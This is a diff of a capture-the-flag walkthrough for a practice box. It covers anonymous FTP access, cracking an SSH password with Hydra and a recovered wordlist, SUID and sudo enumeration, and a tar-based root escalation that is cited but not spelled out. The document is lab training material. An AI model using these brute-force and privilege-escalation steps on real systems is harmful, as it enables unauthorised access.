@@ -1,21 +1,20 @@
 Navigated to the web server on port 80 which gave a short intro to the challenge context (so not within scope of the CTF target, so to speak)
 
--> After:
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+FTP SERVER ANONYMOUS LOG IN
 
-Connected to the open ftp port which gave message saying it supported anonymous login only
+-> After this we connected to the open FTP port anonymously (no password required)
 
 ftp 10.10.255.159
-
-No password.
 
 Had two files available:
 
 locks.txt
 task.txt
 
-GET for both of them onto machine
+Downloaded both files onto my machine
 
-Read task.txt first:
+-> Read task.txt first:
 
 cat task.txt
 1.) Protect Vicious.
@@ -24,7 +23,7 @@ cat task.txt
 -lin
 
 
-and then locks.txt:
+-> and then locks.txt:
 
 at locks.txt
 rEddrAGON
@@ -53,14 +52,21 @@ dr@goN5YNd1c@73
 rEDdrAGOnSyNDiCat3
 r3ddr@g0N
 ReDSynd1ca7e
-
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+USING HYDRA TO CRACK SSH WITH THE WORDLIST WE FOUND
 
 hydra -l lin -P locks.txt ssh://10.10.255.159 -t 4
 
 Succesful - RedDr4gonSynd1cat3
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+LINUX PRIVILEGE ESCALATION
+SUID BIT ENUMERATION
+
 Once logged in as lin we were able to get the user flag!
 
+
+Finding SUID bit set with below command: 
 
 find / -perm -u=s -type f 2>/dev/null
 
@@ -86,13 +92,12 @@ find / -perm -u=s -type f 2>/dev/null
 /bin/ping6
 /bin/umount
 
+Okay nothing we can use here for now....
 
-Desktop$ find / -type f -name "*.bak" 2>/dev/null
-/var/backups/group.bak
-/var/backups/shadow.bak
-/var/backups/passwd.bak
-/var/backups/gshadow.bak
+--------------------------------------------------------------------------
+ENUMERATING SUDO PRIVILEGES FOR LIN
 
+Now, lets find out if lin has sudo privileges for any commands:
 
 sudo -l
 [sudo] password for lin: 
@@ -103,8 +108,10 @@ Matching Defaults entries for lin on bountyhacker:
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 
-We can see that we can run the tar bin as root!
+We can see that we can run the tar bin as root! This is a major win for us.
 
 Knowing this, we check https://gtfobins.github.io/gtfobins/tar/ and see that we can use sudo to get root priv!
 
-With this, we escalate to root and read root.txt
+With this, we escalate to root and read root.txt. 
+
+CTF COMPLETE :)
